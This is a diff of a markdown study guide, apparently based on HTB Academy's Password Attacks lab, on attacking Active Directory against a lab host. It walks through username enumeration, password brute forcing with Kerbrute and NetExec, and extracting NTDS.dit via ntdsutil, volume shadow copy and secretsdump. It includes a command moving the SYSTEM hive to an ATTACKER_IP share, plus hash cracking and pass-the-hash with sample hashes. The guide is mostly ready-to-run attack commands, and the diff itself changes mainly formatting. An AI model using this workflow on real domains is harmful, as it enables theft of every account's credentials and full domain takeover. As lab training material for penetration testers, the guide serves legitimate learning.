@@ -1,30 +1,34 @@
-# Active Directory NTDS.dit Attacks
+# 🎫 NTDS.dit Extraction & Analysis
 
 ## 🎯 Overview
 
 **NTDS.dit** (NT Directory Services Directory Information Tree) is the **holy grail** of Active Directory attacks. This file contains:
-- **Every domain user's password hash**
-- **Group memberships and permissions**
-- **Kerberos keys and authentication data**
-- **Complete domain schema information**
+
+* **Every domain user's password hash**
+* **Group memberships and permissions**
+* **Kerberos keys and authentication data**
+* **Complete domain schema information**
 
 > **"If this file can be captured, we could potentially compromise every account on the domain"**
 
 ## 🏗️ Active Directory Authentication Architecture
 
 ### Domain Authentication Flow
+
 ```
 User Login → LSASS.exe → Authentication Packages → NTLM/Kerberos → AD Directory Services
 ```
 
 ### Key Points
-- **Domain-joined systems** authenticate against Domain Controller, not local SAM
-- **Local accounts** still accessible with `hostname\username` or `.\username`
-- **NTDS.dit location**: `%systemroot%\ntds\NTDS.dit` (usually `C:\Windows\NTDS\NTDS.dit`)
+
+* **Domain-joined systems** authenticate against Domain Controller, not local SAM
+* **Local accounts** still accessible with `hostname\username` or `.\username`
+* **NTDS.dit location**: `%systemroot%\ntds\NTDS.dit` (usually `C:\Windows\NTDS\NTDS.dit`)
 
 ## 🔍 Username Enumeration and Discovery
 
 ### OSINT for Employee Discovery
+
 ```bash
 # HTB Academy Example: 
 # Found through social media/company website:
@@ -39,6 +43,7 @@ site:inlanefreight.com "directory" OR "staff" OR "employees"
 ```
 
 ### Username Generation with Username Anarchy
+
 ```bash
 # Clone Username Anarchy
 git clone https://github.com/urbanadventurer/username-anarchy.git
@@ -62,6 +67,7 @@ EOF
 ```
 
 ### Username Enumeration with Kerbrute
+
 ```bash
 # Download Kerbrute
 wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute
@@ -83,6 +89,7 @@ netexec smb 10.129.202.85
 ## 🗡️ Password Attacks Against Active Directory
 
 ### Dictionary Attacks with NetExec
+
 ```bash
 # Brute force single user
 netexec smb 10.129.202.85 -u jmarston -p /usr/share/wordlists/fasttrack.txt -d ILF.local
@@ -95,6 +102,7 @@ netexec smb 10.129.202.85 -u usernames.txt -p /usr/share/wordlists/fasttrack.txt
 ```
 
 ### Kerbrute Password Attacks
+
 ```bash
 # Brute force with Kerbrute
 ./kerbrute bruteuser -d ILF.local --dc 10.129.202.85 /usr/share/wordlists/fasttrack.txt jmarston
@@ -106,6 +114,7 @@ netexec smb 10.129.202.85 -u usernames.txt -p /usr/share/wordlists/fasttrack.txt
 ## 🎫 NTDS.dit Extraction Methods
 
 ### Method 1: NetExec ntdsutil Module (Fastest)
+
 ```bash
 # One-command NTDS.dit extraction
 netexec smb 10.129.202.85 -u jmarston -p 'P@ssword!' -d ILF.local -M ntdsutil
@@ -120,6 +129,7 @@ netexec smb 10.129.202.85 -u jmarston -p 'P@ssword!' -d ILF.local --ntds
 ```
 
 ### Method 2: Manual VSS (Volume Shadow Copy)
+
 ```bash
 # Step 1: Connect with Evil-WinRM
 evil-winrm -i 10.129.202.85 -u jmarston -p 'P@ssword!'
@@ -147,6 +157,7 @@ cmd.exe /c move C:\temp\SYSTEM \\ATTACKER_IP\CompData
 ```
 
 ### Method 3: Impacket secretsdump
+
 ```bash
 # Remote NTDS.dit extraction
 python3 secretsdump.py ILF.local/jmarston:P@ssword!@10.129.202.85 -just-dc-ntlm
@@ -158,6 +169,7 @@ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
 ## 🔓 Hash Cracking and Analysis
 
 ### Hash Format Understanding
+
 ```bash
 # NTDS.dit output format:
 # username:RID:LM_hash:NT_hash:::
@@ -168,6 +180,7 @@ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
 ```
 
 ### Extracting and Cracking Jennifer Stapleton's Hash
+
 ```bash
 # Extract Jennifer Stapleton's hash
 grep -i "stapleton" ntds_dump.txt
@@ -184,6 +197,7 @@ hashcat -m 1000 jstapleton_hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
 ### Bulk Hash Processing
+
 ```bash
 # Extract all NT hashes from NTDS dump
 grep ":::" ntds_dump.txt | cut -d: -f4 > all_nt_hashes.txt
@@ -198,6 +212,7 @@ grep -iv disabled ntds_dump.txt | cut -d: -f1 > enabled_users.txt
 ## ⚔️ Pass-the-Hash Attacks
 
 ### When Cracking Fails
+
 ```bash
 # Use NT hash directly for authentication
 evil-winrm -i 10.129.202.85 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
@@ -212,6 +227,7 @@ netexec smb SUBNET_RANGE -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
 ## 🏆 Complete HTB Academy Attack Workflow
 
 ### Phase 1-2: Discovery and Enumeration
+
 ```bash
 # 1. OSINT: Found John Marston, Carol Johnson, Jennifer Stapleton
 # 2. Generate usernames with Username Anarchy
@@ -226,6 +242,7 @@ netexec smb 10.129.202.85  # → domain:ILF.local
 ```
 
 ### Phase 3-4: Password Attack and NTDS Extraction
+
 ```bash
 # 5. Password brute force
 ./kerbrute bruteuser -d ILF.local --dc 10.129.202.85 /usr/share/wordlists/fasttrack.txt jmarston
@@ -237,6 +254,7 @@ netexec smb 10.129.202.85 -u jmarston -p 'P@ssword!' -d ILF.local -M ntdsutil
 ```
 
 ### Phase 5: Hash Cracking
+
 ```bash
 # 7. Extract Jennifer Stapleton's hash
 # jstapleton:1134:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
@@ -250,6 +268,7 @@ hashcat -m 1000 jstapleton_hash.txt /usr/share/wordlists/rockyou.txt
 ## 📋 Quick Reference Commands
 
 ### Discovery
+
 ```bash
 # Domain enumeration
 netexec smb TARGET_IP
@@ -262,6 +281,7 @@ netexec smb TARGET_IP -u users.txt -p passwords.txt --continue-on-success -d DOM
 ```
 
 ### NTDS.dit Extraction
+
 ```bash
 # NetExec method (recommended)
 netexec smb TARGET_IP -u USER -p PASS -d DOMAIN.local -M ntdsutil
@@ -274,6 +294,7 @@ python3 secretsdump.py DOMAIN.local/USER:PASS@TARGET_IP -just-dc-ntlm
 ```
 
 ### Hash Analysis
+
 ```bash
 # Extract NT hashes
 grep ":::" ntds_dump.txt | cut -d: -f4 > nt_hashes.txt
@@ -304,6 +325,6 @@ Based on the complete walkthrough:
 6. **Pass-the-Hash** - Use hashes when cracking fails
 7. **Complete methodology** - From OSINT to domain compromise
 
----
+***
 
-*This guide covers the complete NTDS.dit attack methodology as demonstrated in HTB Academy's Password Attacks module.* 
+_This guide covers the complete NTDS.dit attack methodology as demonstrated in HTB Academy's Password Attacks module._
